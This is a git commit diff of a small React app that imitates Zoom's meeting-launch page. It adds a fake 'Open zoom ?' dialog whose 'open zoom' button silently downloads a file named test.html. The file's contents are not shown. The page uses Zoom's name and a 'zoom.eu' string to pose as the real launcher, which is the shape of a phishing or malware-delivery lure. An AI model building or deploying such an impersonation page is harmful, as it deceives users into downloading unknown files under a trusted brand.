47303f524c43116cc529f5f75dc5c8bb6641a241
danieldagot <danieldagot@gmail.com>
2020-03-30 16:35:41 +0300

    dwonlode

--- src/App.js
+++ src/App.js
@@ -1,24 +1,22 @@
 import React from 'react';
 import logo from './logo.svg';
 import './App.css';
-
+import AlertDialogSlide from "./componnents/popup"
+import 'bootstrap/dist/css/bootstrap.min.css';
 function App() {
   return (
-    <div className="App">
-      <header className="App-header">
-        <img src={logo} className="App-logo" alt="logo" />
-        <p>
-          Edit <code>src/App.js</code> and save to reload.
-        </p>
-        <a
-          className="App-link"
-          href="https://reactjs.org"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          Learn React
-        </a>
-      </header>
+    <div  className = "container" > 
+      <div className = "zoomlogo">  zoom </div>
+      <div className= "box">
+        <div className ="iner_box">
+          <p id  ="loading"  >Launching...</p>
+          <div id = "manege">
+          Please click <strong>Open Zoom Meetings</strong> if you see the system dialog.
+      </div>
+          <p id = "links"> nothing prompts from browser, click here to launch the meeting, or download & run Zoom.</p>
+        </div>
+      </div>
+    <AlertDialogSlide />       
     </div>
   );
 }
---
+++ src/componnents/popup.js
@@ -0,0 +1,39 @@
+import React, { Component, useState, useEffect } from "react";import Modal from 'react-bootstrap/Modal'
+import Button from 'react-bootstrap/Button'
+import "./popup.css"
+import { saveAs } from 'file-saver';
+ import download from "downloadjs" 
+let dn = function ()
+{
+  download("/test.html")
+}
+
+export default function AlertDialogSlide() {
+  const [smShow, setSmShow] = useState(false);
+  const [lgShow, setLgShow] = useState(true);
+  return (
+    <>
+      {/* <Button onClick={() => setLgShow(true)}>Large modal</Button> */}
+      <Modal
+        //size="sm"
+        show={lgShow}
+        onHide={() => setLgShow(false)} 
+        dialogClassName="modal-90w"
+        aria-labelledby="example-custom-modal-styling-title"
+      >
+        <Modal.Body>
+        <div classname = "heder"> Open zoom ?</div>
+          <div id = "zoombox" > 
+           <p className = "zoombody">    { `https://zoom.eu whats to open this application.` }
+           
+           </p>
+           </div>
+           <div className = "Buttons">
+           <Button onClick = { () => {setLgShow(false)}} >cancel</Button>
+           <button type="button" onClick = {()=>{ dn()} } class="btn btn-link">open zoom</button>
+           </div>
+        </Modal.Body>
+      </Modal>
+    </>
+  );
+}
